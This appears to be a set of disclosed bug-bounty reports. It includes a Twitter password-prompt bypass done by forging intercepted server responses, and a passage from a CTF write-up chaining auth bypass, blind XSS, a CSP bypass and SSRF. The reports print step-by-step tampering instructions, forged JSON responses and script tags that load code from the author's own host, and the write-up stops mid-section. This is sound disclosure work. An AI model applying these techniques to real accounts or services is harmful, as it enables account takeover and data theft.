- **Weakness:** Improper Authentication - Generic
- **Program:** MTN Group
- **Reporter:** @its_afolic
- **Bounty:** - usd
- **Disclosed:** 2020-04-13T07:20:58.027Z
- **CVE(s):** -

**Vulnerability Information:**

I attached a PDF document to this report which explained the vulnerability in full details and I also attached a link to the POC video in the document.

## Impact

Account take over of about any MTN user account.

---

### [Bypass Password Authentication for updating email and phone number - Security Vulnerability](https://hackerone.com/reports/770504)

- **Report ID:** `770504`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** X / xAI
- **Reporter:** @jayesh25
- **Bounty:** - usd
- **Disclosed:** 2020-02-08T00:00:38.718Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:** 
[Additional requirement for authentication is an extra layer of security for a person's Twitter account. Instead of only entering the password at the time of log in, twitter further Introduces additional layer of security by prompting users to enter their password before attempting to update any crucial Information such as email ID or phone numbers. 

This additional security measure from twitter provides protection to the victim's account, considering that a victim's session may have been hijacked by a hacker, however, due to this additional layer of security Implemented by twitter the hacker would not be able to change the victim's personal details such as phone number or email id, as they will be prompted to enter the victim's account password In order to make these changes, which will not be known to a hacker (In case of a session hijack)

This report is to bring to your attention a security vulnerability that will allow hackers that have hijacked a user's session to bypass the password screen (Without knowing the user's password) that is prompted to a user before trying to update the email ID and phone number under Settings and Privacy -> Accounts.]

**Description:** 
[For users that have had their twitter session hijacked, this security vulnerability would enable a hacker to completely take over a victim's account as they will be able to change the victim's e-mail ID and phone number by bypassing the password screen prompted during the verification process. 

This will allow the hacker to reset the password either by requesting for a link and/or code on the email/mobile updated by them against the victim's account, therefore resulting in a complete account take over.

The security vulnerability is basically related to client side processing that is undertaken based on the response received from the server. 

For example : Let's say the hacker enters the password and clicks on 'Next' there is a flow token that is generated by the client which is sent to the server. The server would then validate the password and return a response to the client to Indicate whether the next page must be loaded or If there was an error related to the request i.e. 'Wrong password'.

The security vulnerability allows for the client request and server response to be Intercepted and manipulated such that even though the hacker may have entered an Incorrect password, the server response can be Intercepted modified to a valid JSON response with the token flow number that was originally sent by the client to the server, therefore leading for twitter to believe that the authentication was successful and bypassing the password screen, thereby providing access to hackers to update the victims' email ID and phone number without the need for additional authentication.
]

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

With the assumption that the victim's twitter session is 'hijacked' and in a 'logged in' state for the hacker. The below steps must be followed In order to reproduce the security vulnerability.

Security Vulnerability #1 - Update Victim's E-mail ID - Bypass password screen

  1. Go to Settings and Privacy -> Accounts
  2. Click on Email -> Update email address
  3. Enter any random password and Click on 'Next'
  4. Intercept the request the above request
  5. Copy the flow token up to :
  6. Forward client request to server and Intercept the response from server to this request
  7. Modify the Intercepted Server's Response with the below text **please paste the flow token from step 5 below and remove the [square brackets]**
  8. Forward the modified 'Server Response' to the client
  9. This will now bypass the password screen irrespective of It being a correct or Incorrect password - You must now 'Enter' your email ID and verify It In order to add the email ID to the victim's account

-------------------------------------------COPY FROM BELOW START------------------------------------------------

HTTP/1.1 200 OK
access-control-allow-credentials: true
access-control-allow-origin: https://twitter.com
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-disposition: attachment; filename=json.json
Content-Length: 2732
content-type: application/json; charset=utf-8
date: Mon, 06 Jan 2020 21:12:15 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Mon, 06 Jan 2020 21:12:15 GMT
pragma: no-cache
server: tsa_k
strict-transport-security: max-age=631138519
x-connection-hash: 1d41600d4a1940ad3cab723b3ec0b57a
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-response-time: 308
x-tsa-request-body-time: 1
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 0

{"flow_token":"[PASTE FLOW TOKEN HERE]:1","status":"success","subtasks":[{"subtask_id":"EmailAssocEnterEmail","enter_email":{"primary_text":{"text":"Change email","entities":[]},"secondary_text":{"text":"Your current email is ███. What would you like to update it to? Your email is not displayed in your public profile on Twitter.","entities":[]},"hint_text":"Email address","next_link":{"link_type":"subtask","link_id":"next_link","label":"Next","subtask_id":"EmailAssocVerifyEmail"},"skip_link":{"link_type":"abort","link_id":"cancel_link","label":"Cancel"},"discoverability_setting":{"primary_text":{"text":"Let people who have your email address find and connect with you on Twitter. Learn more","entities":[{"from_index":77,"to_index":87,"navigation_link":{"link_type":"web_link","link_id":"open_web_link","label":"learn_more_email_phone_disco_link","url":"https://help.twitter.com/safety-and-security/email-and-phone-discoverability-settings"}}]},"value_type":"boolean","value_identifier":"email_discoverability_setting","value_data":{"boolean_data":{"initial_value":false}}}}},{"subtask_id":"EmailAssocVerifyEmail","email_verification":{"primary_text":{"text":"We sent you a code","entities":[]},"secondary_text":{"text":"Enter it below to verify your email.\t","entities":[]},"detail_text":{"text":"Didn't receive code?","entities":[{"from_index":0,"to_index":20,"navigation_link":{"link_type":"subtask","link_id":"resend_email_verification_link","subtask_id":"DidNotReceiveEmailDialog"}}]},"hint_text":"Verification code","email":{"subtask_data_reference":{"key":"email","subtask_id":"EmailAssocEnterEmail"}},"name":{"subtask_data_reference":{"key":"name","subtask_id":"EmailAssocEnterEmail"}},"next_link":{"link_type":"task","link_id":"next_link","label":"Verify"},"fail_link":{"link_type":"subtask","link_id":"fail_link","subtask_id":"EmailAssocEnterEmail"},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_id":"EmailAssocEnterEmail"},"verification_status_polling_enabled":false}},{"subtask_id":"DidNotReceiveEmailDialog","menu_dialog":{"primary_text":{"text":"Didnât receive the code?","entities":[]},"primary_action_links":[{"link_type":"subtask","link_id":"email_link","label":"Resend","subtask_navigation_context":{"action":"resend_email"},"subtask_id":"EmailAssocVerifyEmail"}],"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_navigation_context":{"action":"cancel_email_dialog"},"subtask_id":"EmailAssocVerifyEmail"},"dismiss_link":{"link_type":"subtask","link_id":"dismiss_link","subtask_navigation_context":{"action":"dismiss_email_dialog"},"subtask_id":"EmailAssocVerifyEmail"}}}]}

 -------------------------------------------COPY END------------------------------------------------


---------------------------------------------------------------------------------------------------------------------------------------------------------------
Security Vulnerability #2 - Update Victim's phone number - Bypass password screen

  1. Go to Settings and Privacy -> Accounts
  2. Click on Phone -> Add/Update phone number
  3. Enter any random password and Click on 'Next'
  4. Intercept the request the above request
  5. Copy the flow token up to :
  6. Forward client request to server and Intercept the response from server to this request
  7. Modify the Intercepted Server's Response with the below text **please paste the flow token from step 5 below and remove the [square brackets]**
  8. Forward the modified 'Server Response' to the client
  9. This will now bypass the password screen irrespective of It being a correct or Incorrect password - You must now 'Enter' your mobile number and verify It In order to add the phone number to the victim's account

-------------------------------------------COPY FROM BELOW START------------------------------------------------

HTTP/1.1 200 OK
access-control-allow-credentials: true
access-control-allow-origin: https://twitter.com
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-disposition: attachment; filename=json.json
Content-Length: 16612
content-type: application/json; charset=utf-8
date: Mon, 06 Jan 2020 21:36:13 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Mon, 06 Jan 2020 21:36:13 GMT
pragma: no-cache
server: tsa_k
strict-transport-security: max-age=631138519
x-connection-hash: be41fa15964cca748cd82c001728c777
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-response-time: 305
x-tsa-request-body-time: 0
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 0


{"flow_token":"[PASTE FLOW TOKEN HERE]:1","status":"success","subtasks":[{"subtask_id":"EnterPhoneForAssociation","enter_phone":{"primary_text":{"text":"Add a phone number","entities":[]},"secondary_text":{"text":"Enter the phone number youâd like to associate with your Twitter account. Youâll get a verification code sent here.","entities":[]},"hint_text":"Your phone number","next_link":{"link_type":"subtask","link_id":"next_link","label":"Next","subtask_id":"PhoneAssociationVerificationAlert"},"skip_link":{"link_type":"abort","link_id":"cancel_link","label":"Cancel"},"discoverability_setting":{"primary_text":{"text":"Let people who have your phone number find and connect with you on Twitter. Learn more","entities":[{"from_index":76,"to_index":86,"navigation_link":{"link_type":"web_link","link_id":"open_web_link","label":"learn_more_email_phone_disco_link","url":"https://help.twitter.com/safety-and-security/email-and-phone-discoverability-settings"}}]},"value_type":"boolean","value_identifier":"phone_discoverability_setting","value_data":{"boolean_data":{"initial_value":false}}},"country_codes":[{"id":"AF","text":{"text":"+93 Afghanistan","entities":[]}},{"id":"AL","text":{"text":"+355 Albania","entities":[]}},{"id":"DZ","text":{"text":"+213 Algeria","entities":[]}},{"id":"AS","text":{"text":"+1 American Samoa","entities":[]}},{"id":"AD","text":{"text":"+376 Andorra","entities":[]}},{"id":"AO","text":{"text":"+244 Angola","entities":[]}},{"id":"AI","text":{"text":"+1 Anguilla","entities":[]}},{"id":"AG","text":{"text":"+1 Antigua and Barbuda","entities":[]}},{"id":"AR","text":{"text":"+54 Argentina","entities":[]}},{"id":"AM","text":{"text":"+374 Armenia","entities":[]}},{"id":"AW","text":{"text":"+297 Aruba","entities":[]}},{"id":"AU","text":{"text":"+61 Australia","entities":[]}},{"id":"AT","text":{"text":"+43 Austria","entities":[]}},{"id":"AZ","text":{"text":"+994 Azerbaijan","entities":[]}},{"id":"BS","text":{"text":"+1 Bahamas","entities":[]}},{"id":"BH","text":{"text":"+973 Bahrain","entities":[]}},{"id":"BD","text":{"text":"+880 Bangladesh","entities":[]}},{"id":"BB","text":{"text":"+1 Barbados","entities":[]}},{"id":"BY","text":{"text":"+375 Belarus","entities":[]}},{"id":"BE","text":{"text":"+32 Belgium","entities":[]}},{"id":"BZ","text":{"text":"+501 Belize","entities":[]}},{"id":"BJ","text":{"text":"+229 Benin","entities":[]}},{"id":"BM","text":{"text":"+1 Bermuda","entities":[]}},{"id":"BT","text":{"text":"+975 Bhutan","entities":[]}},{"id":"BO","text":{"text":"+591 Bolivia","entities":[]}},{"id":"BQ","text":{"text":"+599 Bonaire, Sint Eustatius and Saba","entities":[]}},{"id":"BA","text":{"text":"+387 Bosnia and Herzegovina","entities":[]}},{"id":"BW","text":{"text":"+267 Botswana","entities":[]}},{"id":"BR","text":{"text":"+55 Brazil","entities":[]}},{"id":"VG","text":{"text":"+1 British Virgin Islands","entities":[]}},{"id":"BN","text":{"text":"+673 Brunei","entities":[]}},{"id":"BG","text":{"text":"+359 Bulgaria","entities":[]}},{"id":"BF","text":{"text":"+226 Burkina Faso","entities":[]}},{"id":"BI","text":{"text":"+257 Burundi","entities":[]}},{"id":"KH","text":{"text":"+855 Cambodia","entities":[]}},{"id":"CM","text":{"text":"+237 Cameroon","entities":[]}},{"id":"CA","text":{"text":"+1 Canada","entities":[]}},{"id":"CV","text":{"text":"+238 Cape Verde","entities":[]}},{"id":"KY","text":{"text":"+1 Cayman Islands","entities":[]}},{"id":"CF","text":{"text":"+236 Central African Republic","entities":[]}},{"id":"TD","text":{"text":"+235 Chad","entities":[]}},{"id":"CL","text":{"text":"+56 Chile","entities":[]}},{"id":"CN","text":{"text":"+86 China","entities":[]}},{"id":"CO","text":{"text":"+57 Colombia","entities":[]}},{"id":"KM","text":{"text":"+269 Comoros","entities":[]}},{"id":"CG","text":{"text":"+242 Congo","entities":[]}},{"id":"CK","text":{"text":"+682 Cook Islands","entities":[]}},{"id":"CR","text":{"text":"+506 Costa Rica","entities":[]}},{"id":"HR","text":{"text":"+385 Croatia","entities":[]}},{"id":"CU","text":{"text":"+53 Cuba","entities":[]}},{"id":"CW","text":{"text":"+599 CuraÃ§ao","entities":[]}},{"id":"CY","text":{"text":"+357 Cyprus","entities":[]}},{"id":"CZ","text":{"text":"+420 Czech Republic","entities":[]}},{"id":"CI","text":{"text":"+225 CÃ´te d'Ivoire","entities":[]}},{"id":"DK","text":{"text":"+45 Denmark","entities":[]}},{"id":"DJ","text":{"text":"+253 Djibouti","entities":[]}},{"id":"DM","text":{"text":"+1 Dominica","entities":[]}},{"id":"DO","text":{"text":"+1 Dominican Republic","entities":[]}},{"id":"EC","text":{"text":"+593 Ecuador","entities":[]}},{"id":"EG","text":{"text":"+20 Egypt","entities":[]}},{"id":"SV","text":{"text":"+503 El Salvador","entities":[]}},{"id":"GQ","text":{"text":"+240 Equatorial Guinea","entities":[]}},{"id":"ER","text":{"text":"+291 Eritrea","entities":[]}},{"id":"EE","text":{"text":"+372 Estonia","entities":[]}},{"id":"ET","text":{"text":"+251 Ethiopia","entities":[]}},{"id":"FK","text":{"text":"+500 Falkland Islands","entities":[]}},{"id":"FO","text":{"text":"+298 Faroe Islands","entities":[]}},{"id":"FJ","text":{"text":"+679 Fiji","entities":[]}},{"id":"FI","text":{"text":"+358 Finland","entities":[]}},{"id":"FR","text":{"text":"+33 France","entities":[]}},{"id":"GF","text":{"text":"+594 French Guiana","entities":[]}},{"id":"PF","text":{"text":"+689 French Polynesia","entities":[]}},{"id":"GA","text":{"text":"+241 Gabon","entities":[]}},{"id":"GM","text":{"text":"+220 Gambia","entities":[]}},{"id":"GE","text":{"text":"+995 Georgia","entities":[]}},{"id":"DE","text":{"text":"+49 Germany","entities":[]}},{"id":"GH","text":{"text":"+233 Ghana","entities":[]}},{"id":"GI","text":{"text":"+350 Gibraltar","entities":[]}},{"id":"GR","text":{"text":"+30 Greece","entities":[]}},{"id":"GL","text":{"text":"+299 Greenland","entities":[]}},{"id":"GD","text":{"text":"+1 Grenada","entities":[]}},{"id":"GP","text":{"text":"+590 Guadeloupe","entities":[]}},{"id":"GU","text":{"text":"+1 Guam","entities":[]}},{"id":"GT","text":{"text":"+502 Guatemala","entities":[]}},{"id":"GN","text":{"text":"+224 Guinea","entities":[]}},{"id":"GW","text":{"text":"+245 Guinea-Bissau","entities":[]}},{"id":"GY","text":{"text":"+592 Guyana","entities":[]}},{"id":"HT","text":{"text":"+509 Haiti","entities":[]}},{"id":"HN","text":{"text":"+504 Honduras","entities":[]}},{"id":"HK","text":{"text":"+852 Hong Kong","entities":[]}},{"id":"HU","text":{"text":"+36 Hungary","entities":[]}},{"id":"IS","text":{"text":"+354 Iceland","entities":[]}},{"id":"IN","text":{"text":"+91 India","entities":[]}},{"id":"ID","text":{"text":"+62 Indonesia","entities":[]}},{"id":"IR","text":{"text":"+98 Iran","entities":[]}},{"id":"IQ","text":{"text":"+964 Iraq","entities":[]}},{"id":"IE","text":{"text":"+353 Ireland","entities":[]}},{"id":"IM","text":{"text":"+44 Isle Of Man","entities":[]}},{"id":"IL","text":{"text":"+972 Israel","entities":[]}},{"id":"IT","text":{"text":"+39 Italy","entities":[]}},{"id":"JM","text":{"text":"+1 Jamaica","entities":[]}},{"id":"JP","text":{"text":"+81 Japan","entities":[]}},{"id":"JE","text":{"text":"+44 Jersey","entities":[]}},{"id":"JO","text":{"text":"+962 Jordan","entities":[]}},{"id":"KZ","text":{"text":"+7 Kazakhstan","entities":[]}},{"id":"KE","text":{"text":"+254 Kenya","entities":[]}},{"id":"KI","text":{"text":"+686 Kiribati","entities":[]}},{"id":"KW","text":{"text":"+965 Kuwait","entities":[]}},{"id":"KG","text":{"text":"+996 Kyrgyzstan","entities":[]}},{"id":"LA","text":{"text":"+856 Laos","entities":[]}},{"id":"LV","text":{"text":"+371 Latvia","entities":[]}},{"id":"LB","text":{"text":"+961 Lebanon","entities":[]}},{"id":"LS","text":{"text":"+266 Lesotho","entities":[]}},{"id":"LR","text":{"text":"+231 Liberia","entities":[]}},{"id":"LY","text":{"text":"+218 Libya","entities":[]}},{"id":"LI","text":{"text":"+423 Liechtenstein","entities":[]}},{"id":"LT","text":{"text":"+370 Lithuania","entities":[]}},{"id":"LU","text":{"text":"+352 Luxembourg","entities":[]}},{"id":"MO","text":{"text":"+853 Macao","entities":[]}},{"id":"MK","text":{"text":"+389 Macedonia","entities":[]}},{"id":"MG","text":{"text":"+261 Madagascar","entities":[]}},{"id":"MW","text":{"text":"+265 Malawi","entities":[]}},{"id":"MY","text":{"text":"+60 Malaysia","entities":[]}},{"id":"MV","text":{"text":"+960 Maldives","entities":[]}},{"id":"ML","text":{"text":"+223 Mali","entities":[]}},{"id":"MT","text":{"text":"+356 Malta","entities":[]}},{"id":"MQ","text":{"text":"+596 Martinique","entities":[]}},{"id":"MR","text":{"text":"+222 Mauritania","entities":[]}},{"id":"MU","text":{"text":"+230 Mauritius","entities":[]}},{"id":"YT","text":{"text":"+262 Mayotte","entities":[]}},{"id":"MX","text":{"text":"+52 Mexico","entities":[]}},{"id":"FM","text":{"text":"+691 Micronesia","entities":[]}},{"id":"MD","text":{"text":"+373 Moldova","entities":[]}},{"id":"MC","text":{"text":"+377 Monaco","entities":[]}},{"id":"MN","text":{"text":"+976 Mongolia","entities":[]}},{"id":"ME","text":{"text":"+382 Montenegro","entities":[]}},{"id":"MS","text":{"text":"+1 Montserrat","entities":[]}},{"id":"MA","text":{"text":"+212 Morocco","entities":[]}},{"id":"MZ","text":{"text":"+258 Mozambique","entities":[]}},{"id":"MM","text":{"text":"+95 Myanmar","entities":[]}},{"id":"NA","text":{"text":"+264 Namibia","entities":[]}},{"id":"NR","text":{"text":"+674 Nauru","entities":[]}},{"id":"NP","text":{"text":"+977 Nepal","entities":[]}},{"id":"NL","text":{"text":"+31 Netherlands","entities":[]}},{"id":"NC","text":{"text":"+687 New Caledonia","entities":[]}},{"id":"NZ","text":{"text":"+64 New Zealand","entities":[]}},{"id":"NI","text":{"text":"+505 Nicaragua","entities":[]}},{"id":"NE","text":{"text":"+227 Niger","entities":[]}},{"id":"NG","text":{"text":"+234 Nigeria","entities":[]}},{"id":"NF","text":{"text":"+672 Norfolk Island","entities":[]}},{"id":"MP","text":{"text":"+1 Northern Mariana Islands","entities":[]}},{"id":"NO","text":{"text":"+47 Norway","entities":[]}},{"id":"OM","text":{"text":"+968 Oman","entities":[]}},{"id":"PK","text":{"text":"+92 Pakistan","entities":[]}},{"id":"PS","text":{"text":"+970 Palestine","entities":[]}},{"id":"PA","text":{"text":"+507 Panama","entities":[]}},{"id":"PG","text":{"text":"+675 Papua New Guinea","entities":[]}},{"id":"PY","text":{"text":"+595 Paraguay","entities":[]}},{"id":"PE","text":{"text":"+51 Peru","entities":[]}},{"id":"PH","text":{"text":"+63 Philippines","entities":[]}},{"id":"PL","text":{"text":"+48 Poland","entities":[]}},{"id":"PT","text":{"text":"+351 Portugal","entities":[]}},{"id":"PR","text":{"text":"+1 Puerto Rico","entities":[]}},{"id":"QA","text":{"text":"+974 Qatar","entities":[]}},{"id":"RE","text":{"text":"+262 Reunion","entities":[]}},{"id":"RO","text":{"text":"+40 Romania","entities":[]}},{"id":"RU","text":{"text":"+7 Russia","entities":[]}},{"id":"RW","text":{"text":"+250 Rwanda","entities":[]}},{"id":"KN","text":{"text":"+1 Saint Kitts And Nevis","entities":[]}},{"id":"LC","text":{"text":"+1 Saint Lucia","entities":[]}},{"id":"MF","text":{"text":"+590 Saint Martin","entities":[]}},{"id":"VC","text":{"text":"+1 Saint Vincent And The Grenadines","entities":[]}},{"id":"WS","text":{"text":"+685 Samoa","entities":[]}},{"id":"SM","text":{"text":"+378 San Marino","entities":[]}},{"id":"ST","text":{"text":"+239 Sao Tome And Principe","entities":[]}},{"id":"SA","text":{"text":"+966 Saudi Arabia","entities":[]}},{"id":"SN","text":{"text":"+221 Senegal","entities":[]}},{"id":"RS","text":{"text":"+381 Serbia","entities":[]}},{"id":"SC","text":{"text":"+248 Seychelles","entities":[]}},{"id":"SL","text":{"text":"+232 Sierra Leone","entities":[]}},{"id":"SG","text":{"text":"+65 Singapore","entities":[]}},{"id":"SX","text":{"text":"+1 Sint Maarten (Dutch part)","entities":[]}},{"id":"SK","text":{"text":"+421 Slovakia","entities":[]}},{"id":"SI","text":{"text":"+386 Slovenia","entities":[]}},{"id":"SB","text":{"text":"+677 Solomon Islands","entities":[]}},{"id":"SO","text":{"text":"+252 Somalia","entities":[]}},{"id":"ZA","text":{"text":"+27 South Africa","entities":[]}},{"id":"KR","text":{"text":"+82 South Korea","entities":[]}},{"id":"SS","text":{"text":"+211 South Sudan","entities":[]}},{"id":"ES","text":{"text":"+34 Spain","entities":[]}},{"id":"LK","text":{"text":"+94 Sri Lanka","entities":[]}},{"id":"SR","text":{"text":"+597 Suriname","entities":[]}},{"id":"SZ","text":{"text":"+268 Swaziland","entities":[]}},{"id":"SE","text":{"text":"+46 Sweden","entities":[]}},{"id":"CH","text":{"text":"+41 Switzerland","entities":[]}},{"id":"TW","text":{"text":"+886 Taiwan","entities":[]}},{"id":"TJ","text":{"text":"+992 Tajikistan","entities":[]}},{"id":"TZ","text":{"text":"+255 Tanzania","entities":[]}},{"id":"TH","text":{"text":"+66 Thailand","entities":[]}},{"id":"CD","text":{"text":"+243 The Democratic Republic Of Congo","entities":[]}},{"id":"TL","text":{"text":"+670 Timor-Leste","entities":[]}},{"id":"TG","text":{"text":"+228 Togo","entities":[]}},{"id":"TO","text":{"text":"+676 Tonga","entities":[]}},{"id":"TT","text":{"text":"+1 Trinidad and Tobago","entities":[]}},{"id":"TN","text":{"text":"+216 Tunisia","entities":[]}},{"id":"TR","text":{"text":"+90 Turkey","entities":[]}},{"id":"TM","text":{"text":"+993 Turkmenistan","entities":[]}},{"id":"TC","text":{"text":"+1 Turks And Caicos Islands","entities":[]}},{"id":"TV","text":{"text":"+688 Tuvalu","entities":[]}},{"id":"VI","text":{"text":"+1 U.S. Virgin Islands","entities":[]}},{"id":"UG","text":{"text":"+256 Uganda","entities":[]}},{"id":"UA","text":{"text":"+380 Ukraine","entities":[]}},{"id":"AE","text":{"text":"+971 United Arab Emirates","entities":[]}},{"id":"GB","text":{"text":"+44 United Kingdom","entities":[]}},{"id":"US","text":{"text":"+1 United States","entities":[]}},{"id":"UY","text":{"text":"+598 Uruguay","entities":[]}},{"id":"UZ","text":{"text":"+998 Uzbekistan","entities":[]}},{"id":"VU","text":{"text":"+678 Vanuatu","entities":[]}},{"id":"VE","text":{"text":"+58 Venezuela","entities":[]}},{"id":"VN","text":{"text":"+84 Vietnam","entities":[]}},{"id":"XK","text":{"text":"+383 XK","entities":[]}},{"id":"YE","text":{"text":"+967 Yemen","entities":[]}},{"id":"ZM","text":{"text":"+260 Zambia","entities":[]}},{"id":"ZW","text":{"text":"+263 Zimbabwe","entities":[]}}],"default_country_code":"IN"}},{"subtask_id":"PhoneAssociationVerificationAlert","alert_dialog":{"next_link":{"link_type":"subtask","link_id":"next_link","label":"OK","subtask_id":"PhoneAssociationVerification"},"primary_text":{"text":"Verify phone","entities":[]},"secondary_text":{"text":"We'll send your verification code to . Standard SMS, call and data fees may apply.","entities":[{"from_index":37,"to_index":37,"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}}]},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Edit","subtask_id":"EnterPhoneForAssociation"}}},{"subtask_id":"PhoneAssociationVerification","phone_verification":{"primary_text":{"text":"We sent you a code","entities":[]},"secondary_text":{"text":"Enter it below to verify .","entities":[{"from_index":25,"to_index":25,"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}}]},"detail_text":{"text":"Didn't receive code?","entities":[{"from_index":0,"to_index":20,"navigation_link":{"link_type":"subtask","link_id":"resend_phone_verification_link","subtask_id":"DidNotReceiveSMSDialog"}}]},"hint_text":"Verification code","phone_number":{"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}},"next_link":{"link_type":"task","link_id":"next_link","label":"Verify"},"fail_link":{"link_type":"subtask","link_id":"fail_link","subtask_id":"EnterPhoneForAssociation"},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_id":"EnterPhoneForAssociation"},"auto_verify_hint_text":"Waiting for SMS to arrive...","send_via_voice":false,"phone_country_code":{"subtask_data_reference":{"key":"country_code","subtask_id":"EnterPhoneForAssociation"}}}},{"subtask_id":"DidNotReceiveSMSDialog","menu_dialog":{"primary_text":{"text":"Didnât receive the code?","entities":[]},"primary_action_links":[{"link_type":"subtask","link_id":"sms_link","label":"Resend","subtask_navigation_context":{"action":"resend_sms"},"subtask_id":"PhoneAssociationVerification"}],"cancel_link":{"link_type":"task","link_id":"skip_link","label":"Cancel"},"dismiss_link":{"link_type":"subtask","link_id":"dismiss_link","subtask_navigation_context":{"action":"dismiss_phone_dialog"},"subtask_id":"PhoneAssociationVerification"}}}]}

 -------------------------------------------COPY END------------------------------------------------

## Impact: 
[This a serious security vulnerability, as It could lead to a hacker completely taking over the user's account by overriding twitter's security protocol as they could use this technique to bypass the password screen which would enable them to update the email ID and the phone number against the victim's account thereby providing the hacker with complete authority/access over the victim's account]

## Supporting Material/References:
[Please see attached the video for demonstration and steps to reproduce this security vulnerability]

## Impact

An attacker could potentially capitalize on the 'hijacked' session and completely take over the victim's twitter account by modifying the email id and mobile phone number of the user without having to authenticate themselves with the correct password. As a result, It would defeat Twitter's additional layer of security i.e. password prompt and would lead to the user being locked out from ever accessing their twitter account again.

---

### [[h1-415 2020] My writeup on how to retrieve the special secret document](https://hackerone.com/reports/776684)

- **Report ID:** `776684`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** h1-ctf
- **Reporter:** @blaklis
- **Bounty:** - usd
- **Disclosed:** 2020-02-03T22:42:23.673Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
An attacker without any privilege is able to retrieve the special secret document, hosted on the https://h1-415.h1ctf.com website. To do so, multiple steps are required : 

1. The authentication must be bypassed to have a licensed account;
2. The support team portal is vulnerable to a blind XSS,;
3. The CSP rules are bypassable using sort of path traversal to render other javascript files on githack CDN.
4. A direct object reference allow to modify data from every users from the support panel, without filtering of characters.
5. The document converter is vulnerable to SSRF if the user name contains HTML tags.
6. The chrome debugger API is opened, allowing to dump data from the browser used by the document converter.

Here are the steps to finally get this special document !

# Initially

You can register an account on the application. After the registration process, you receive a QRCode which contains two hexadecimal blobs separated by a colon. This QRCode is used in case you forgot your password, and allow to bypass the login process.

The QRCode first blob is simply the username, in hexadecimal ASCII. By removing the second blob and trying to use the QRCode, the error message indicates that it's a code, that is necessary and correctly validated to allow being logged in with this email.

From a simple user without license, fields seems to be well escaped, and the converter seems to works well, without much possibility to exploit anything. Fields (usernames, etc) are correctly filtered; special characters are deleted from those fields.

We can see from the main page that the Jobert's mail address (jobert@mydocz.cosmic) is leaking from the *data-email* attribute of its message.

# Authentication bypass thanks to data filtering

As we saw, data are filtered and special characters are deleted from users information. By creating a user with the jobert@mydocz.cosmic< email, the registration process is successful; however, thanks to the data filtering, the generated QRCode contains the real jobert@mydocz.cosmic email instead of the created one, with a code that also matches well.

By using this QRcode on the https://h1-415.h1ctf.com/recover endpoint, we can now login as Jobert to have a more privileged user, that can use the support endpoint.

We can't change information for this account, and the license seems to be expired, so we can't even use the upload functionality.

# Blind XSS & CSP bypass on the support endpoint

The support endpoint seems to be a chatbot (or a real employee? who knows...), and sending some XSS payloads demonstrates easily that at least the frontend part doesn't sanitize messages at all.

By sending the "quit" message, we're asked to rate the overall communication. If the note is set to the minimum - 1 star - we're notified that an employee will check the discussion to see what happened.

Inputting a XSS payload and then quitting with a bad rating for this discussion, we can trap an employee to make him execute some javascript; however, a Content-Security-Policy rules is in place, containing the following : 

* default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: * *

It also does not leak the referrer, thanks to the *Referrer-Policy* header set to *strict-origin-when-cross-origin*.

As we can see, we're able to load javascript files from https://raw.githack.com/mattboldt/typed.js/master/lib/ URL, and it's child. I created a new repo on Github, which contains some of my javascript payload. Here is an example, that extracts the current URL to my own server : 

*https://github.com/Blaklis/typed.js/blob/master/lib/yolo.js*

As Githack serves GItHub files directly, as a CDN, and that it treats ..%2f as a traversal, we can simply point to our files using the following URL : 

*https://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fBlaklis/typed.js/master/lib//yolo.js*

For the browser, this URL is a child of *https://raw.githack.com/mattboldt/typed.js/master/lib/* and completely respects the CSP rule.

Final payload : <script src="https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fBlaklis/typed.js/master/lib//yolo.js"/>

This leaks a URL that is directly accessible - even unauthenticated - to the support panel for this very own discussion, for example https://h1-415.h1ctf.com/support/review/5529c168769ff7e096bb40cc9438a5295692bb567844c837bb5fae37980612ee

# Direct object reference allows to edit every users' information without filtering

When we're on the support page, we can see a form that allow to change users' information. This form also contains a *user_id* field, which is not checked at all. Consequently, we're able to change every users name through this page.
Also, we can see that there's no filtering on characters on this page, allowing to includes some XSS payload in the name, while it wasn't possible for the public /settings endpoint.

The jobert's account can't be modified, even with this method. We can so create an account, and then edit it through this way to have some forbidden characters in its name.

A payload example, considering we own the user 16 : 

```
POST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1
[...]
Cookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3xpA6zCiBFkPrghj_3RpXJ-fk3jcMmDceyjpTAg9aKhrZIVpplGapxcg2iA4769A4a4m5E3iCBvARCvjLtQGKYVrq-baEeZlym6Ztr-zvv97iGuv6lWkbyv4k8PpvKcQqcKZcpNLGHg_w-QKRNi0N.XiDmKA.o5lphYOx41pDSbeAm37D7wA9grg

name=<script src="http://blakl.is/pwn.js"/>&user_id=16&_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7
```

# SSRF in document conversion

The document converter allow to upload images to get PDF as output. The PDF also contains the owner's name, and is vulnerable to a XSS when being interpreted by the converter. This allows to make some redirect using a <script>document.location.href='//website'</script> payload, for example. It also interprets iframe, which allow to inspects which ports are opened locally easily.

